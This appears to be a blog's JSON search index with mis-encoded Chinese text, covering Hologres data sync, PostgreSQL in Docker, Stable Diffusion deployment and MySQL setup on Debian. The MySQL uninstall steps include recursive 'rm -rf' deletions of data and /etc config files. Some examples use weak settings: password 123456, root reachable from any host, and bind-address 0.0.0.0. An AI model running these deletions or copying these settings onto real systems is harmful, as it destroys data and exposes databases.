&#x27;repoæ‰€å±ç»„ç»‡åç§°&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.type IS &#x27;äº‹ä»¶ç±»å‹&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.created_at IS &#x27;äº‹ä»¶å‘â½£æ—¶é—´&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.action IS &#x27;äº‹ä»¶è¡Œä¸º&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.commit_id IS &#x27;æäº¤è®°å½•ID&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.member_id IS &#x27;æˆå‘˜ID&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.language IS &#x27;ç¼–ç¨‹è¯­â¾”&#x27;;COMMIT; å®æ—¶åŒæ­¥æ•°æ®è‡³Hologresç™»å½•DataWorksæ§åˆ¶å°ã€‚ç®¡ç†ä¸­å¿ƒã€‚ æ•°æ®æºåç§°:è‡ªå®šä¹‰æ•°æ®æºåç§°ï¼ŒmysqlDataã€‚ é…ç½®æ¨¡å¼:é€‰æ‹©è¿æ¥ä¸²æ¨¡å¼ã€‚ JDBCè¿æ¥åœ°å€:å•å‡»æ–°å¢åœ°å€ï¼Œé…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼š ä¸»æœºåœ°å€IPï¼šrm-bp1z69dodhh85z9qa.mysql.rds.aliyuncs.com ç«¯â¼å·ï¼š3306 è¾“å…¥æ•°æ®åº“åç§°åï¼Œå®Œæ•´çš„JDBC URLä¸º jdbc:mysql:&#x2F;&#x2F;rm-bp1z69dodhh85z9qa.mysql.rds.aliyuncs.com:3306 &#x2F;github_events_share æ•°æ®åº“åç§°:github_events_share ç”¨æˆ·å:workshop åˆ›å»ºå®æ—¶åŒæ­¥ä»»åŠ¡åœ¨æ•°æ®é›†æˆé¡µé¢ï¼Œåœ¨åˆ›å»ºåŒæ­¥ä»»åŠ¡ä¸­ï¼Œé€‰æ‹©æ¥æºä¸å»å‘æ•°æ®æºï¼Œå•å‡»å¼€å§‹åˆ›å»ºã€‚ æ¥æºï¼šé€‰æ‹©MySQLã€‚ å»å‘ï¼šé€‰æ‹©Hologresã€‚ ç›®æ ‡è¡¨æ˜ å°„å‹¾é€‰github_public_eventè¡¨ï¼Œå•å‡»æ‰¹é‡åˆ·æ–°æ˜ å°„ã€‚åŸºäºä¸Šè¿°å·²åˆ›å»ºçš„Hologreså†…éƒ¨è¡¨ï¼Œå°†ç›®æ ‡Schemaåæ”¹ä¸ºhologres_dataset_github_eventï¼Œç›®æ ‡è¡¨åæ”¹ä¸ºhologres_github_eventï¼Œå•å‡»å®Œæˆé…ç½®ã€‚ å½“ç»“æ„è¿ç§»å’Œå…¨é‡åˆå§‹åŒ–å®Œæˆåï¼Œè¡¨ç¤ºæ•°æ®åŒæ­¥å·²æˆåŠŸï¼Œå°±å¯ä»¥ç™»å½•Hologresè¿›è¡Œå®æ—¶æ•°æ®åˆ†æã€‚ å®æ—¶OLAPåˆ†æ123456789101112SELECT repo_name, COUNT(*) AS eventsFROM hologres_dataset_github_event.hologres_github_eventWHERE created_at &gt;= now() - interval &#x27;1 day&#x27;GROUP BY repo_nameORDER BY events DESCLIMIT 5; æŸ¥è¯¢å®æ—¶æ›´æ–°çš„è¿‡å»24å°æ—¶GitHubæœ€æ´»è·ƒé¡¹â½¬ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Hologres","slug":"Hologres","permalink":"https://banjinmei.github.io/tags/Hologres/"},{"name":"mysql","slug":"mysql","permalink":"https://banjinmei.github.io/tags/mysql/"}],"author":"mu"},{"title":"docker postgresql","slug":"docker-postgresql","date":"2024-08-14T15:02:46.000Z","updated":"2024-08-14T15:04:28.000Z","comments":true,"path":"2024/08/14/docker-postgresql/","permalink":"https://banjinmei.github.io/2024/08/14/docker-postgresql/","excerpt":"","text":"åˆ›å»ºå®¹å™¨1docker run -id --name=postgresql -v postgre-data:/var/lib/postgresql/data -p 5432:5432 -e POSTGRES_PASSWORD=123456 -e LANG=C.UTF-8 postgres è¿›å…¥1docker exec -it my-postgres psql -U postgres 123456789SELECT version();create database test_db;CREATE TABLE test_table ( id SERIAL PRIMARY KEY, name VARCHAR(50) NOT NULL, age INTEGER );INSERT INTO test_table (name, age) VALUES (&#x27;m&#x27;, 30);SELECT * FROM test_table; nodejsæµ‹è¯•123456789101112131415161718192021222324252627282930// å¼•å…¥ &#x27;pg&#x27; æ¨¡å—const &#123; Client &#125; = require(&#x27;pg&#x27;);// è®¾ç½®æ•°æ®åº“è¿æ¥å‚æ•°const client = new Client(&#123; user: &#x27;postgres&#x27;, host: &#x27;localhost&#x27;, database: &#x27;test_db&#x27;, password: &#x27;123456&#x27;, port: 5432, &#125;);// è¿æ¥åˆ°æ•°æ®åº“client.connect() .then(() =&gt; &#123; console.log(&#x27;å·²è¿æ¥åˆ°PostgreSQLæ•°æ®åº“&#x27;); // æ‰§è¡ŒæŸ¥è¯¢ return client.query(&#x27;SELECT NOW()&#x27;);// è·å–å½“å‰æ—¶é—´ &#125;) .then(res =&gt; &#123; console.log(&#x27;ç»“æœ:&#x27;, res.rows); &#125;) .catch(err =&gt; &#123; console.error(&#x27;é”™è¯¯:&#x27;, err.stack); &#125;) .finally(() =&gt; &#123; // å…³é—­è¿æ¥ client.end(); &#125;); C#nugetNpgsql 12345678910111213141516171819202122232425262728293031// PostgreSQL æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²string connString = &quot;Host=localhost;Port=5432;Username=postgres;Password=123456;Database=test_db&quot;;using (var conn = new NpgsqlConnection(connString))&#123; try &#123; // æ‰“å¼€æ•°æ®åº“è¿æ¥ conn.Open(); Console.WriteLine(&quot;å·²è¿æ¥åˆ°PostgreSQLæ•°æ®åº“&quot;); // æŸ¥è¯¢ç¤ºä¾‹ï¼Œè·å–å½“å‰æ—¶é—´ string sql = &quot;SELECT NOW()&quot;; using (NpgsqlCommand cmd = new NpgsqlCommand(sql, conn)) &#123; // æ‰§è¡ŒæŸ¥è¯¢å¹¶è¾“å‡ºç»“æœ var reader = cmd.ExecuteReader(); while (reader.Read()) &#123; Console.WriteLine(&quot;å½“å‰æ—¶é—´: &quot; + reader.GetDateTime(0)); &#125; &#125; &#125; catch (Exception ex) &#123; Console.WriteLine(ex.ToString()); &#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"postgresql","slug":"postgresql","permalink":"https://banjinmei.github.io/tags/postgresql/"}],"author":"mu"},{"title":"stable diffusion","slug":"stable-diffusion","date":"2024-08-13T13:22:29.000Z","updated":"2024-08-13T14:02:26.000Z","comments":true,"path":"2024/08/13/stable-diffusion/","permalink":"https://banjinmei.github.io/2024/08/13/stable-diffusion/","excerpt":"","text":"èƒŒæ™¯çŸ¥è¯†éƒ¨ç½²Stable Diffusionï¼Œå†…ç½®æ¨¡å‹åº“+å¸¸ç”¨æ’ä»¶+ControlNetã€‚ è¿™æ˜¯ä¸€é¡¹æ¥è¿‘é›¶åŸºç¡€çš„æ•™ç¨‹ï¼Œå…¶ä¸­å¹¶ä¸ä¼šåŒ…å«å¤æ‚çš„æ¦‚å¿µæˆ–è€…æ·±å¥¥çš„ç®—æ³•ã€‚æ¢å¥è¯è¯´ï¼Œåªè¦ä½ ç¨æœ‰è®¡ç®—æœºåŸºç¡€ï¼Œäº†è§£å¦‚ä½•æ•²å…¥å‘½ä»¤ï¼ŒçŸ¥é“æ€ä¹ˆä½¿ç”¨æµè§ˆå™¨æ‰“å¼€ç½‘é¡µï¼Œæ‚¨å°±èƒ½å¾ˆè½»æ¾çš„å®Œæˆè¿™ä¸ªå®éªŒã€‚ AIç”Ÿæˆå†…å®¹çš„å½¢å¼ç›¸å½“ä¸°å¯Œï¼Œé™¤äº†æ–‡å­—å¤–ï¼Œè¿˜å¯ä»¥è¿›è¡Œç»˜ç”»ã€ä½œæ›²ã€æ¼”å”±ã€ç¼–å‰§ã€è®¾è®¡ç­‰ã€‚æœ€è¿‘çƒ­åº¦éå¸¸é«˜çš„Text to Imageå°±æ˜¯AIåŠ æŒä¸‹éå¸¸æ—¶é«¦çš„ä¸€ç§å›¾ç‰‡åˆ›é€ æ–¹å¼ã€‚çœ‹çœ‹ä¸‹é¢è¿™äº›å›¾ç‰‡ï¼Œä½ ä¸€å®šå¾ˆéš¾æƒ³è±¡å®ƒä»¬éƒ½æ˜¯AIç”Ÿæˆçš„å§ã€‚ è®¸å¤šäººå¯èƒ½è§‰å¾—ï¼Œä½¿ç”¨AIGCæœ‰å¾ˆé«˜çš„é—¨æ§›ï¼Œæ™®é€šäººæ˜¯å¾ˆéš¾å…¥é—¨çš„ã€‚å…¶å®ä¸ç„¶ï¼Œéšç€AIæŠ€æœ¯çš„å¿«é€Ÿå‘å±•ä»¥åŠä¼—å¤šå¼€æºé¡¹ç›®çš„è¯ç”Ÿï¼Œæˆ‘ä»¬æ¯ä¸ªäººéƒ½å¯ä»¥å¾ˆè½»æ¾ä¸”å»‰ä»·çš„ä½¿ç”¨åˆ°AIGCã€‚è°èƒ½æƒ³åˆ°ï¼Œåœ¨2018 å¹´ï¼Œäººå·¥æ™ºèƒ½ç”Ÿæˆçš„ç”»ä½œåœ¨ä½³å£«å¾—æ‹å–ä»·è¿˜é«˜è¾¾43.25ä¸‡ç¾å…ƒï¼Œè€Œæ—¶éš”æ‰æ•°å¹´ï¼Œè®©AIä¸ºæˆ‘ä»¬åˆ›ä½œç»˜ç”»å·²ç»æˆäº†äººäººè§¦æ‰‹å¯åŠçš„äº‹æƒ…ã€‚ åœ¨è¿™äº›å¼€æºé¡¹ç›®ä¸­ï¼ŒStable Diffusionæ— ç–‘æ˜¯ä¼˜ç§€ç”Ÿä¹‹ä¸€ã€‚Stable Diffusionæ˜¯ä¸€ç§æ‰©æ•£æ¨¡å‹ï¼ˆDiffusion Modelï¼‰çš„å˜ä½“ï¼Œç§°ä¸ºâ€œæ½œåœ¨æ‰©æ•£æ¨¡å‹â€ï¼ˆLatent Diffusion Modelï¼‰ï¼Œç”±CompVisã€Stability AIå’ŒLAIONçš„ç ”ç©¶äººå‘˜å’Œå·¥ç¨‹å¸ˆåˆ›å»ºã€‚ å®ƒä½¿ç”¨æ¥è‡ªLAION-5Bæ•°æ®åº“å­é›†çš„å›¾åƒè¿›è¡Œè®­ç»ƒã€‚ä½¿ç”¨è¿™ä¸ªæ¨¡å‹ï¼Œå¯ä»¥ç”ŸæˆåŒ…æ‹¬äººè„¸åœ¨å†…çš„ä»»ä½•å›¾åƒï¼Œå› ä¸ºæœ‰å¼€æºçš„é¢„è®­ç»ƒæ¨¡å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨è‡ªå·±çš„æœºå™¨ä¸Šè¿è¡Œå®ƒã€‚Stable Diffusionèƒ½å¤Ÿæ ¹æ®æˆ‘ä»¬æä¾›çš„ä¸€äº›æç¤ºè¯ä»¥åŠå¯ä»¥è°ƒæ•´çš„éƒ¨åˆ†å‚æ•°ï¼Œé€šè¿‡æ¨¡å‹è®¡ç®—ç”Ÿæˆä¸€å¼ ä¸é”™çš„å›¾ç‰‡ã€‚ å‡½æ•°è®¡ç®—FC å‡½æ•°è®¡ç®—ï¼ˆFunction Computeï¼‰æ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨çš„å…¨æ‰˜ç®¡ Serverless è®¡ç®—æœåŠ¡ï¼Œæ‚¨æ— éœ€ç®¡ç†æœåŠ¡å™¨ç­‰åŸºç¡€è®¾æ–½ï¼Œåªéœ€ç¼–å†™ä»£ç å¹¶ä¸Šä¼ ï¼Œå‡½æ•°è®¡ç®—ä¼šä¸ºæ‚¨å‡†å¤‡å¥½è®¡ç®—èµ„æºï¼Œå¹¶ä»¥å¼¹æ€§ã€å¯é çš„æ–¹å¼è¿è¡Œä»£ç ã€‚ SD1.5åŠ¨æ¼«é£æ ¼çœŸäººé£æ ¼è½»é‡ç‰ˆTensorRTè‰ºæœ¯å­— æç¤ºè¯å°±æ˜¯ç”Ÿæˆå›¾ç‰‡çš„ä¾æ®ï¼Œæ—¢å¯ä»¥æ˜¯æè¿°éœ€è¦ç”Ÿæˆå†…å®¹çš„è¯ï¼Œä¾‹å¦‚girl, sunset, forestç­‰ï¼›ä¹Ÿå¯ä»¥æ˜¯ç”¨äºæ˜¯æè¿°å›¾åƒå±æ€§çš„è¯ï¼Œä¾‹å¦‚best quality, beautiful, masterpieceç­‰ã€‚æˆ‘ä»¬ç”šè‡³å¯ä»¥é€šè¿‡æç¤ºè¯é€‰æ‹©å›¾ç‰‡ç”Ÿæˆçš„è§†è§’ã€å…‰çº¿ã€ç”»é£ï¼›äººç‰©çš„å§¿åŠ¿ã€ç€è£…ã€è¡¨æƒ…ã€èƒŒæ™¯çš„å†…å®¹ç­‰ã€‚ å»ºè®®åŠ ä¸Šç”»é£æè¿°è¯ï¼Œè®©æ‚¨çš„å›¾ç‰‡æ›´åŠ ç¾è§‚ï¼Œå¦‚ï¼šCyberpunkï¼ˆèµ›åšæœ‹å…‹ï¼‰ï¼Œshinkai makotoï¼ˆæ–°æµ·è¯šï¼‰ï¼ŒGhibli Studioï¼ˆå‰åœåŠ›ï¼‰ï¼ŒPaul Gauguinï¼ˆæ¢µé«˜ï¼‰ç­‰ç­‰ SDæç¤ºè¯qwenä½ æ˜¯ä¸€ä¸ªä¼˜ç§€çš„å¯¼æ¼”å’ŒStable Difusionä¸“å®¶ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è¦å…±åŒå®Œæˆä¸€éƒ¨ç”µè§†å‰§çš„AIåˆ›ä½œï¼Œè¯·ä½ æ ¹æ®æˆ‘ç»™ä½ çš„åœºæ™¯ï¼Œå°½å¯èƒ½è¯¦ç»†åœ°æè¿°åœºæ™¯çš„ç”»é¢ï¼Œå¹¶ç»™å‡ºåˆ¶ä½œè¿™ä¸ªåœºç´¯çš„Stable Difusion è‹±è¯­æç¤ºè¯ï¼Œæ‰€æœ‰æç¤ºè¯ä¸­éƒ½è¦åŠ ä¸Šâ€œç”»é¢æ¯”ä¾‹16:9,è¶…å†™å®ï¼Œé«˜è´¨é‡ï¼Œâ€çš„è‹±è¯­ï¼Œåœºæ™¯æè¿°ä¸å°‘äº200å­—ï¼Œæç¤ºè¯ä¸å°‘äº30ä¸ªå•è¯ã€‚å¦‚æœä½ æ˜ç™½äº†ï¼Œè¯·å›å¤â€œæ˜ç™½â€ï¼Œç„¶åæˆ‘å°†å¼€å§‹å‘ç»™ä½ åœºæ™¯ã€‚åœºæ™¯ä¸€:ä¸€ä¸ª12å²çš„å°‘å¹´ç™¾é‡Œä¸œå›åœ¨ä¸€æ£µæ¡ƒèŠ±æ ‘ä¸Šèººç€é—­ç›®å…»ç¥ï¼Œæ‰‹ä¸Šæ‹¿ç€ä¸€ä¸ªç™½ç‰é…’æ¯ï¼Œç©¿ç€æµ…è“è‰²çš„é•¿è¢ï¼Œå¸¦ä¸€ç‚¹ç‚¹èŠ±çº¹æ ·å¼ï¼Œè…°é—´ä½©ç€é•¿å‰‘ï¼Œé˜³å…‰é€è¿‡æ ‘å¶é…’åœ¨ä»–çš„è„¸ä¸Šï¼Œè¿œï¼Œè½é›ªé£ï¼Œæ¡ƒèŠ±ç››å¼€ï¼Œæ˜¾ç¤ºå°æ²³ï¼Œè¿œå¤„çš„å‡‰äº­ã€èŒ…å±‹ã€è‰åªã€‚ prompt:Prompt for Stable Diffusion:â€œScene ratio 16:9, hyper-realistic, high-quality. A 12-year-old boy in ancient Chinese clothing, wearing a light blue robe with intricate patterns, lying on a branch of a peach blossom tree. He holds a white jade wine cup in his hand and has a long sword at his waist. Snowflakes and peach blossoms mix together as they fall, while sunlight filters through the branches. Thereâ€™s a small river, a pavilion, and a thatched cottage in the background, all set against a backdrop of green grass and a serene landscape.â€ é‡‡æ ·æ­¥æ•°40 é«˜åº¦1980 å®½åº¦1080 æç¤ºè¯å¼•å¯¼ é«˜ ç§å­1åå‘æç¤ºè¯ å†™å…¥ä¸è¦ä»€ä¹ˆ æ‰©å±• é«˜çº§å®šåˆ¶ loraæ¨¡å‹https://www.liblib.art/ æˆ‘ä»¬å¯ä»¥ä»LiblibAIä¸‹è½½loraæ¨¡å‹åˆ°æœ¬åœ°ï¼Œç„¶åæŠŠå®ƒä¸Šä¼ åˆ°&#x2F;mnt&#x2F;auto&#x2F;sd&#x2F;models&#x2F;Lora&#x2F;ç›®å½•ã€‚ å‰å¾€LiblibAIï¼Œè¿›è¡ŒåŸºç¡€æ¨¡å‹çš„ç­›é€‰ã€‚ æ‹“å±• ControlNetä½¿ç”¨ControlNetåŒ…å«æ’ä»¶å’Œæ¨¡å‹ä¸¤éƒ¨åˆ†ã€‚ä¸ºäº†é™ä½è´¹ç”¨æ¶ˆè€—ï¼Œå»ºè®®å…ˆä¸‹è½½åˆ°æœ¬åœ°åï¼Œé€šè¿‡adminä¸Šä¼ è‡³NASã€‚ ControlNetæ’ä»¶åœ°å€ã€‚ é¡¹ç›®åœ°å€ï¼šhttps://github.com/Mikubill/sd-webui-controlnetã€‚ è¿›å…¥é¡µé¢åï¼Œå•å‡»å³ä¾§çš„Codeï¼Œå¹¶é€‰æ‹©Download ZIPä¸‹è½½æ’ä»¶ä»£ç ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://banjinmei.github.io/tags/AI/"},{"name":"SD","slug":"SD","permalink":"https://banjinmei.github.io/tags/SD/"}],"author":"mu"},{"title":"debian mysql","slug":"debian-mysql","date":"2024-08-12T13:47:36.000Z","updated":"2024-11-29T19:02:29.856Z","comments":true,"path":"2024/08/12/debian-mysql/","permalink":"https://banjinmei.github.io/2024/08/12/debian-mysql/","excerpt":"","text":"1.æ›´æ–°è½¯ä»¶åŒ…åˆ—è¡¨è¿è¡Œ apt update å‘½ä»¤æ¥å®Œæˆã€‚ sudo apt update 2. å®‰è£…MySQL APTé…ç½®å·¥å…·å®‰è£…MySQL 1234567wget https://dev.mysql.com/get/mysql-apt-config_0.8.32-1_all.debapt install gnupgdpkg -i mysql-apt-config_0.8.32-1_all.debapt update 3. å®‰è£…MySQLæœåŠ¡å™¨1apt install mysql-server 4 . æ›´æ–°è½¯ä»¶åŒ…åˆ—è¡¨ä»¥ä¾¿APTå¯ä»¥è¯†åˆ«æ–°æ·»åŠ çš„MySQLä»“åº“ã€‚ 1sudo apt update 5. å¯åŠ¨MySQLæœåŠ¡å¯åŠ¨MySQLæœåŠ¡å¹¶è®¾ç½®å®ƒåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨å¯åŠ¨ã€‚ 123sudo systemctl start mysqlsudo systemctl enable mysql 6. ç™»å½•MySQLæœåŠ¡å™¨ä½¿ç”¨rootç”¨æˆ·ç™»å½•åˆ°MySQLæœåŠ¡å™¨ã€‚ 1mysql -u root -p è¾“å…¥å¯†ç åï¼Œæ‚¨å°†è¿›å…¥MySQLå‘½ä»¤è¡Œã€‚ä½¿ç”¨ exit å‘½ä»¤é€€å‡ºã€‚ 1234567ALTER USER &#x27;myuser&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new_password&#x27;; å¯é€‰ 7.æµ‹è¯•1CREATE DATABASE mydatabase; Query OK, 1 row affected (0.00 sec) 123456789101112131415CREATE USER &#x27;myuser&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;mypassword&#x27;;GRANT ALL PRIVILEGES ON mydatabase.* TO &#x27;myuser&#x27;@&#x27;localhost&#x27;;FLUSH PRIVILEGES;Use mydatabase;CREATE TABLE `Test` ( `id` INT NOT NULL AUTO_INCREMENT, `name` VARCHAR(100) NOT NULL, `age` INT NOT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;Insert into Test(name,age) value (&#x27;zs&#x27;,17);SELECT * FROM Test python mysql test 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#pip install mysql-connector-pythonimport mysql.connectorfrom mysql.connector import Errordef create_connection(host_name, user_name, user_password, db_name): connection = None try: connection = mysql.connector.connect( host=host_name, user=user_name, passwd=user_password, database=db_name ) print(&quot;Connection to MySQL DB successful&quot;) except Error as e: print(f&quot;The error &#x27;&#123;e&#125;&#x27; occurred&quot;) return connectiondef execute_read_query(connection, query): cursor = connection.cursor() result = None try: cursor.execute(query) result = cursor.fetchall() return result except Error as e: print(f&quot;The error &#x27;&#123;e&#125;&#x27; occurred&quot;)# Replace with your actual credentials 3306host = &quot;39.108.xxxxx&quot; user = &quot;root&quot;password = &quot;xx.zxcv&quot;database = &quot;xx&quot;connection = create_connection(host, user, password, database)query = &quot;SELECT * FROM test LIMIT 5&quot; # Replace &#x27;your_table&#x27; with the name of your tableresults = execute_read_query(connection, query)for result in results: print(result)# Remember to close the connection when you&#x27;re doneif connection.is_connected(): connection.close() print(&quot;MySQL connection is closed&quot;) 8. é‡å¯MySQLæœåŠ¡ä¿å­˜å¹¶å…³é—­æ–‡ä»¶åï¼Œé‡æ–°å¯åŠ¨MySQLæœåŠ¡ä»¥åº”ç”¨æ›´æ”¹ã€‚ 12345678#restartsudo systemctl restart mysql#åœæ­¢sudo systemctl stop mysql#statussystemctl status mysql æŸ¥çœ‹çŠ¶æ€ 9. å¤‡ä»½1234mysql -u ç”¨æˆ·å -p æ•°æ®åº“å &lt; æ–‡ä»¶è·¯å¾„.sqlmysql -u ç”¨æˆ·å -p -e &quot;CREATE DATABASE mydatabase;&quot;mysql -u ç”¨æˆ·å -p mydatabase &lt; /path/to/backup.sql 10.docker1docker run --name myadmin -d -e PMA_ARBITRARY=1 -p 12121:80 phpmyadmin err1130 (HY000): HostHost is not allowed to connect to this MySQL server mysql&gt;use mysql; &#x2F;&#x2F;é€‰ä¸­æ•°æ®åº“ mysql&gt;select â€˜hostâ€™ from user where user&#x3D;â€™rootâ€™; &#x2F;&#x2F;æŸ¥çœ‹è¯¥è¡¨çš„å€¼ mysql&gt;update user set host &#x3D; â€˜%â€™ where user &#x3D;â€™rootâ€™; &#x2F;&#x2F;ä¿®æ”¹ mysql&gt;flush privileges; &#x2F;&#x2F;åˆ·æ–°æ•°æ®åº“ æ£€æŸ¥MySQLæœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ï¼ˆå¦‚ my.cnf æˆ– my.iniï¼‰ï¼Œç¡®ä¿æ²¡æœ‰ç¦æ­¢è¿œç¨‹è¿æ¥çš„ç›¸å…³è®¾ç½®ï¼Œ bind-address å‚æ•°é€šå¸¸éœ€è¦è®¾ç½®ä¸º 0.0.0.0 æˆ–è€…æŒ‡å®šçš„å…¬ç½‘IPåœ°å€ä»¥æ¥å—è¿œç¨‹è¿æ¥ã€‚ mysqlå¸è½½å¸è½½ â€“å¸è½½å½“å‰MySQLå®ä¾‹ï¼š 123sudo apt-get remove --purge mysql-server mysql-client mysql-commonsudo apt-get autoremovesudo apt-get autoclean åˆ é™¤MySQLçš„æ•°æ®ç›®å½•ï¼ˆé»˜è®¤ä¸º&#x2F;var&#x2F;lib&#x2F;mysqlï¼‰ï¼š 1sudo rm -rf /var/lib/mysql æ¸…ç†æ®‹ç•™çš„é…ç½®æ–‡ä»¶ï¼š 1sudo find /etc -name &quot;mysql*&quot; | sudo xargs rm -rf æ›´æ–°åŒ…ç®¡ç†å™¨çš„ç´¢å¼•ï¼š 1sudo apt-get update é‡æ–°å®‰è£…MySQLæœåŠ¡å™¨ï¼š 1sudo apt-get install mysql-server ---sql è¿œç¨‹é”™è¯¯ Host is not allowed to connect to this MySQL serveré€šè¿‡è¿œç¨‹å®¢æˆ·ç«¯è®¿é—®MySQLæœåŠ¡å™¨æ—¶ä¼šé‡åˆ°â€œHost is not allowed to connect to this MySQL serverâ€çš„é”™è¯¯æç¤ºã€‚ åŸå› MySQLæœåŠ¡å™¨å½“å‰é…ç½®ä¸å…è®¸æ¥è‡ªç‰¹å®šä¸»æœºçš„è¿æ¥å°è¯•ã€‚ è§£å†³æ–¹æ³•å…è®¸è¿œç¨‹ä¸»æœºè®¿é—®MySQLæœåŠ¡å™¨ï¼ŒæŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š ç™»å½•æœ¬åœ°MySQLæœåŠ¡å™¨ï¼šä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•åˆ°MySQLæœåŠ¡å™¨ï¼Œè¾“å…¥MySQL rootç”¨æˆ·çš„å¯†ç ï¼š 1mysql -u root -p é€‰æ‹©MySQLæ•°æ®åº“ï¼šç™»å½•æˆåŠŸåï¼Œåˆ‡æ¢åˆ°MySQLç³»ç»Ÿæ•°æ®åº“ï¼š 1use mysql; æ›´æ–°ç”¨æˆ·æƒé™ï¼šä¿®æ”¹rootç”¨æˆ·çš„hostå­—æ®µï¼ˆæˆ–å…¶ä»–éœ€è¦è¿œç¨‹è®¿é—®çš„ç”¨æˆ·ï¼‰ï¼Œå…è®¸ä»»æ„è¿œç¨‹ä¸»æœºï¼ˆç”¨ â€˜%â€™ è¡¨ç¤ºï¼‰è¿›è¡Œè¿æ¥ï¼Œä½†è¿™ä¸€æ­¥å¯èƒ½æ¶‰åŠåˆ°å®‰å…¨é£é™©ï¼Œå»ºè®®åªé’ˆå¯¹éœ€è¦è¿œç¨‹è®¿é—®çš„ç‰¹å®šç”¨æˆ·è®¾ç½®å…·ä½“çš„è¿œç¨‹IPåœ°å€ï¼Œè€Œä¸æ˜¯ä½¿ç”¨é€šé…ç¬¦ % å¼€å¯æ‰€æœ‰è¿œç¨‹è®¿é—®ï¼š 1update user set host = &#x27;%&#x27; where user = &#x27;root&#x27;; åˆ·æ–°æƒé™ï¼š 1flush privileges; é˜²ç«å¢™è®¾ç½®ï¼šç¡®ä¿æœåŠ¡å™¨çš„é˜²ç«å¢™è§„åˆ™å…è®¸MySQLæœåŠ¡ç«¯å£ï¼ˆé»˜è®¤ä¸º3306ï¼‰ä¸Šçš„å…¥ç«™æµé‡ã€‚ MySQLé…ç½®æ–‡ä»¶ï¼šæ£€æŸ¥MySQLæœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ï¼ˆå¦‚ my.cnf æˆ– my.iniï¼‰ï¼Œç¡®ä¿æ²¡æœ‰ç¦æ­¢è¿œç¨‹è¿æ¥çš„ç›¸å…³è®¾ç½®ï¼Œ bind-address å‚æ•°é€šå¸¸éœ€è¦è®¾ç½®ä¸º 0.0.0.0 æˆ–è€…æŒ‡å®šçš„å…¬ç½‘IPåœ°å€ä»¥æ¥å—è¿œç¨‹è¿æ¥ã€‚ ä½¿ç”¨å‘½ä»¤è¡Œå¤‡ä»½ç‰¹å®šè¡¨åœ¨MySQLä¸­ï¼Œå¦‚æœæ‚¨æƒ³è¦å¤‡ä»½ç‰¹å®šçš„è¡¨è€Œä¸æ˜¯æ•´ä¸ªæ•°æ®åº“ï¼Œå¯ä»¥ä½¿ç”¨mysqldumpå·¥å…·æ¥å®Œæˆã€‚ä»¥ä¸‹æ˜¯å…·ä½“çš„æ“ä½œæ­¥éª¤ï¼š å‡è®¾æ‚¨çš„æ•°æ®åº“åä¸ºmydatabaseï¼Œéœ€è¦å¤‡ä»½çš„è¡¨ä¸ºtable1å’Œtable2ã€‚ å‘½ä»¤æ ¼å¼ï¼š 1mysqldump -u [username] -p[password] [database_name] [table_name1] [table_name2] &gt; [output_file.sql] ç¤ºä¾‹ï¼š 1mysqldump -u root -p mydatabase table1 table2 &gt; backup.sql -u rootï¼šæŒ‡å®šç”¨æˆ·åä¸ºrootã€‚-pï¼šæç¤ºè¾“å…¥å¯†ç ï¼ˆä¸ºäº†å®‰å…¨ï¼Œå¯†ç ä¸ä¼šç›´æ¥æ˜¾ç¤ºåœ¨å‘½ä»¤è¡Œä¸­ï¼‰ã€‚mydatabaseï¼šè¦å¤‡ä»½çš„æ•°æ®åº“åã€‚table1 table2ï¼šéœ€è¦å¤‡ä»½çš„è¡¨åã€‚ backup.sqlï¼šå°†è¾“å‡ºé‡å®šå‘åˆ°backup.sqlæ–‡ä»¶ä¸­ã€‚ æ³¨æ„äº‹é¡¹ç¡®ä¿æ‚¨æœ‰è¶³å¤Ÿçš„æƒé™è®¿é—®æŒ‡å®šçš„æ•°æ®åº“å’Œè¡¨ã€‚å¦‚æœæ‚¨çš„æ•°æ®åº“æˆ–è¡¨ååŒ…å«ç‰¹æ®Šå­—ç¬¦æˆ–è€…ç©ºæ ¼ï¼Œè¯·ç¡®ä¿ç”¨å¼•å·æ‹¬èµ·æ¥ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸­æ‰§è¡Œæ­¤æ“ä½œå‰ï¼Œæœ€å¥½å…ˆåœ¨ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒä¸­æµ‹è¯•å‘½ä»¤ï¼Œä»¥é¿å…ä»»ä½•å¯èƒ½çš„æ•°æ®ä¸¢å¤±æˆ–é”™è¯¯ã€‚è€ƒè™‘å®šæœŸæ£€æŸ¥å¤‡ä»½æ–‡ä»¶çš„å®Œæ•´æ€§å’Œå¯æ¢å¤æ€§ã€‚ 1mysqldump -u root -p mydatabase table1 table2 &gt; backup.sql ä½¿ç”¨ mysqldump 